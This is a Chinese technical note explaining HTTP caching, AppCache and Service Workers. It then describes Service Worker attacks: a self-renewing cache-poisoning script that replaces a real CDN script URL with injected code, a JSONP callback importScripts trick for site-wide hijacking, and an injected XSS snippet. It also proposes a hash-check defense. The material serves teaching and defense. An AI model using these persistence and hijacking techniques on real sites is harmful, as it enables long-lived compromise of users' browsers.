# Service Worker 简单介绍

## 强缓存

+ 通过HTTP返回头的Expire或Cache-Control设置
+ 如果资源没过期, 浏览器直接从本地读取, 不会产生网络流量

## 协商缓存

+ 客户端通过HTTP返回头的Last-Modified或ETag设置
+ 服务器通过HTTP请求头的If-Modified-Since或If-None-Match检测
+ 如果强缓存失败, 服务器收到请求后, 发现资源没有变化, 则返回304状态

## 应用缓存

当用户刷新网页时, 强缓存会失效, 从而产生请求; 即使命中协商缓存, 也需要和服务器通信一次, 大幅增加了载入时间

为了解决这一问题, HTML5增加了AppCache(应用缓存); 它通过一个列表文件, 告知浏览器预先缓存哪些资源
```html
<html manifest="file-list.appcache">
```
应用离线程度很高, 即使刷新网页, 甚至没有网络, 仍然可以访问

缺陷:
+ 安全性, 容易被中间人攻击
+ 可控性, 无法精确控制资源加载时机
+ 灵活性, 资源的更新维护比较麻烦

## localStorage / indexedDB

只适用于固定场合, 难以覆盖HTML中的URL
```html
<div style="background-image: url(...)">
```
是很难对其中的URL进行替换的

## Service Worker

+ service, 后台服务
+ worker, 多进程

一种脱离网页, 在浏览器后台运行的服务进程

+ chrome://serviceworker-internals
+ about:debugging#workers

SW提供了一组API, 能够拦截当前站点产生HTTP请求, 还能控制返回结果
1. SW拦住请求后, 使用Cache Storage里的内容进行返回, 就可以实现离线缓存的功能
2. 如果拦住请求, 使用fetch读取远程资源, 然后再返回, 相当于一个HTTP代理

因为SW里没有localstorage, 一般也不会用indexedDB, 基本都是用Cache Storage

Cache Storage容量很大, 而且以URL为key存储二进制数据, 最适合SW使用

### 攻击方法

#### 缓存污染
+ ARP缓存污染
+ DNS缓存污染
+ CDN缓存污染
+ Cookie, Local Storage 存储XSS (ROOTKIT XSS)

和localstorage一样, SW也面临缓存被篡改的问题
+ 起因: SW和页面共享一个本地存储
+ 结果: 页面上的XSS可以篡改缓存内容, 从而长期感染
+ 影响: 几天、甚至几周之后, 恶意代码仍然生效
+ 范围: 引用该页面的其他子站点, 也受到影响
+ 总结: 本身不是漏洞, 但会加重已有漏洞的危害
+ 防御方案: SW读取JS, HTML等可执行资源时, 先对数据进行检验
    + 并且资源Hash列表不能放在本地存储, 否则Hash也可篡改

```
async function fn() {
    const name = 'tbh:static';
    const url = "https://g.alicdn.com/alilog/mlog/aplus_v2.js";
    const payload = `
alert('evil code - ' + location.href);
`
    let cache = await caches.open(name);
    let req = new Request(url);
    let res = new Response(payload + fn + ';fn()');
    
    setInterval(_ => {
        cache.put(req, res.clone());
    }, 500);
}
fn();
```
这段代码会不断修改缓存的内容, 而且把自身功能(即定时不断写缓存的功能)也写进去;
这样只要一运行, 就会不断覆盖缓存内容, 就算业务方改回来了, 也会被覆盖;
不仅可以持续几天甚至几周时间, 而且其他页面也会受到影响

#### 全站劫持
如果站点下JS文件可控, 可尝试将其当做SW脚本, 从而配合XSS代码, 劫持整个站点的HTTP请求

常见玩法: 利用存在缺陷的JSONP接口

回调缺陷
+ 后端没有对回调名作检验, 导致JSONP返回内容可控
+ 请求: jsonp_url?callback=importScripts(...),
+ 返回: importScripts(...),(data)
+ 结果: XSS可利用该JSONP接口, 当做SW脚本使用

```
<!-- injected by Service Worker -->
<script>
  if (document.readyState === 'complete') {
  	runXss();
  } else {
  	addEventListener('DOMContentLoaded', runXss);
  }
  function runXss() {
  	var div = document.createElement('div');
  	div.innerHTML = 'xss running...';
  	div.style.cssText = 'position:fixed; top:0; right:0; color:red; background:#000; font-size:40px; line-height:40px; z-index:999999';
  	dcocument.body.appendChild(div);
  }
</script>
<!-- end -->
```

总结:
攻击难度大, 需要满足多个条件
+ 存在有缺陷的JSONP接口
+ JSONP的目录尽可能浅(最好在根目录下)
+ JSONP返回的Content-Type必须是JS类型
+ 存在XSS的页面

#### 其他攻击方法
+ 算力利用
+ 流量盗用

